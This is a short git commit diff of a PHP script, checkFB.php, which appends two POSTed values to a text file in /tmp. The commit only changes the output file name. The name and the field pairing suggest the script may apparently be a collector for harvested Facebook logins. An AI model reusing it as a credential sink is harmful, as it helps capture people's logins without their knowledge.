a3ca9ae7541b993c560057acccdb8a7ffe79fd0e
Robs68 <robin.irlinger@gmail.com>
2016-10-28 00:31:10 +0200

    Change

--- checkFB.php
+++ checkFB.php
@@ -1,7 +1,7 @@
 <?php
 if(isset($_POST['key1']) && isset($_POST['key2'])) {
     $data = $_POST['key1'] . '-' . $_POST['key2'] . "\n";
-    $ret = file_put_contents('/tmp/mydata.txt', $data, FILE_APPEND | LOCK_EX);
+    $ret = file_put_contents('/tmp/mydataFB.txt', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
         die('There was an error writing this file');
     }
